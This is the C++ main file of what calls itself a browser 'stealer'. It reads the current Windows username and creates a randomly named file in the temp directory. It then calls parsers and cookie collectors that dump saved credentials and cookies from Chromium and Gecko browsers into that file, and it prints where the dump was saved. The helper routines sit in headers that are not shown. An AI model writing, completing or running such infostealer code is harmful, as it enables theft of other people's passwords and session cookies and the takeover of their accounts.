#define _CRT_SECURE_NO_WARNINGS
#define _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS

#include "includes/ChromiumParser.h"
#include "includes/GeckoParser.h"
#include "includes/Visualizer.h"

std::string stealer_db;

void init_stealer_db()
{
	std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	srand(time(0)); // Seed the random number generator with current time
	for (int i = 0; i < 6; ++i) {
		stealer_db += characters[rand() % characters.length()];
	}

	std::filesystem::path temp_path = std::filesystem::temp_directory_path();
	stealer_db = temp_path.string() + stealer_db;
}

BOOL default_settings(std::string converted_username)
{
	if (!chromium_parser(converted_username, stealer_db))
		std::cout << "Chromium Browsers dump failed!" << std::endl;

	if (!gecko_parser(converted_username, stealer_db))
		std::cout << "Gecko Browsers dump failed!" << std::endl;

	if (!gecko_cookie_collector(converted_username, stealer_db))
		std::cout << "Gecko Cookie Collector failed!" << std::endl;

	if (!chromium_cookie_collector(converted_username, stealer_db))
		std::cout << "Chromium Cookie Collector failed!" << std::endl;

	if (std::filesystem::exists(stealer_db)) {
		std::cout << "Stealer db saved: " << stealer_db << std::endl;
		return true;
	}
	else {
		return false;
	}
}

int main(int argc, char* argv[])
{
	std::string converted_username;
	wchar_t username[MAX_PATH];
	DWORD size = MAX_PATH;
	if (GetUserName(username, &size))
	{
		std::wstring_convert <std::codecvt_utf8<wchar_t>> converter;
		converted_username = converter.to_bytes(username);
	}

	init_stealer_db();

	if (argc > 1)
	{
		if (std::string(argv[1]) == "--help")
		{
			//Visualize here
			Visualizer visualizer(converted_username, stealer_db);
			visualizer.visualization_main();
		}
	}
	else
	{
		if (!default_settings(converted_username))
			return -1;
	}
	return 0;
}